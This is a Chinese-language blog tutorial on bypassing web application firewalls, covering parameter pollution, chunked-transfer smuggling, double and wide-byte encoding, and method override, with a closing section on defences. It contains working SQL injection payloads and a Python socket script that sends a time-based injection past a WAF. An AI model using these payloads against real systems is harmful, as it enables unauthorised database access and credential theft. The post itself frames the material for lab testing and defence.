---
title: "WAF 绕过实战：HTTP 参数污染与分块传输的六种思路"
date: 2026-09-20
lastmod: 2026-09-20
description: "从 WAF 的解析差异出发，讲清参数污染、分块传输、编码变形等绕过手法的原理，以及防守侧该如何收敛。"
author: "Tanglx"
tags: ["WAF", "绕过", "Web安全"]
categories: ["渗透测试"]
cover: "/img/cover/waf.svg"
sticky: true
series: ["Home Lab 实战"]
series_order: 2
toc: true
---

WAF 绕过本质上不是"找一个神奇 payload"，而是**利用 WAF 与后端服务器对同一段 HTTP 报文的理解差异**。理解这一点，绕过手法就能自己推导出来。

## 为什么能绕过

一次请求至少经过三层解析：

```text
客户端 → WAF（规则匹配） → Nginx/Apache（参数解析） → 应用（业务逻辑）
```

只要某一层与其它层的解析结果不一致，就存在差异空间。常见的分歧点：

| 分歧点 | WAF 视角 | 后端视角 |
| --- | --- | --- |
| 同名参数 | 只看第一个 / 拼接 | PHP 取最后一个，Java 取数组 |
| Content-Length 与分块 | 只按 CL 截断 | 按 chunk 解析 |
| 编码 | 只解一层 URL 编码 | 可能解两层（如双重解码中间件） |
| 大小写 | 大小写敏感匹配 | 协议层大小写不敏感 |

## 手法一：HTTP 参数污染（HPP）

经典场景：WAF 只检测第一个 `id`，而 PHP 取最后一个。

```http
POST /api/query HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

id=1&id=1 UNION SELECT username,password FROM users--
```

不同后端的取值行为：

| 后端 | `?id=1&id=2` 取到的值 |
| --- | --- |
| PHP / Apache | `2`（最后一个） |
| JSP / Tomcat | `1`（第一个） |
| ASP.NET | `1,2`（逗号拼接） |
| Python Flask | `1`（第一个） |
| Node Express | `['1','2']` 数组 |

所以绕过策略要根据后端技术栈调整，先探测再动手：

```bash
# 探测后端取值顺序
curl -s "https://target.com/api/query?id=111&id=222" | grep -E "111|222"
```

## 手法二：分块传输（Chunked）

WAF 按 `Content-Length` 取前 N 字节做检测，真实 payload 放在分块里：

```python
import socket

payload = "id=1' AND SLEEP(5)-- "
body = f"{len(payload):x}\r\n{payload}\r\n0\r\n\r\n"

req = (
    "POST /search HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Transfer-Encoding: chunked\r\n"
    f"Content-Length: 3\r\n"          # 故意写一个很小的值
    "Connection: close\r\n\r\n"
    + body
)

s = socket.create_connection(("target.com", 80))
s.sendall(req.encode())
print(s.recv(4096).decode(errors="ignore"))
```

{{< notice danger >}}
`Content-Length` 与 `Transfer-Encoding` 同时出现属于请求走私（Request Smuggling）范畴，在任何未授权的资产上测试都可能造成真实危害。只在自己的靶场里跑。
{{< /notice >}}

## 手法三：编码与字符集变形

WAF 通常只做一次解码，后端可能解码多次：

```text
原始:      UNION SELECT
单层 URL:  %55NION %53ELECT
双重 URL:  %2555NION %2553ELECT
UTF-8:     %c0%a0UNION（非法 UTF-8，部分中间件会剔除）
```

MySQL 的字符集转换也是一个老问题：

```text
# GBK 宽字节注入
输入: %df%27
转义后: %df%5c%27   ->  運'  （%df%5c 组成 GBK 字符，反斜杠被吃掉）
```

## 手法四：HTTP 方法覆盖

部分 WAF 只对 GET/POST 做深度检测：

```http
GET /admin/delete?id=1 HTTP/1.1
Host: target.com
X-HTTP-Method-Override: PUT
```

或者利用 Spring 的 `_method` 参数：

```http
POST /admin/delete?id=1&_method=DELETE HTTP/1.1
```

## 防守侧怎么收敛

站在蓝队视角，我的收敛顺序：

1. **统一解析层**：在 WAF 后面加一层规范化的反向代理，把参数、编码、方法统一后再交给 WAF 规则
2. **拒绝歧义报文**：同时带 `Content-Length` 和 `Transfer-Encoding` 的直接 400
3. **后端做二次校验**：别把 WAF 当唯一防线，预编译语句 + 白名单校验才是根
4. **同源日志比对**：把 WAF 日志和后端访问日志做 diff，diff 不上的就是绕过成功

```sql
-- 一个简单的日志比对思路（伪 SQL）
SELECT w.request_id, w.matched_payload, a.parsed_params
FROM waf_log w
JOIN app_log a ON w.request_id = a.request_id
WHERE w.risk_level > 0
  AND a.parsed_params NOT LIKE CONCAT('%', w.matched_payload, '%');
```

## 小结

绕过手法的生命力来自"解析差异"，防守的关键也在于**消除差异**。把 WAF 当成纵深防御的一环，而不是救世主。
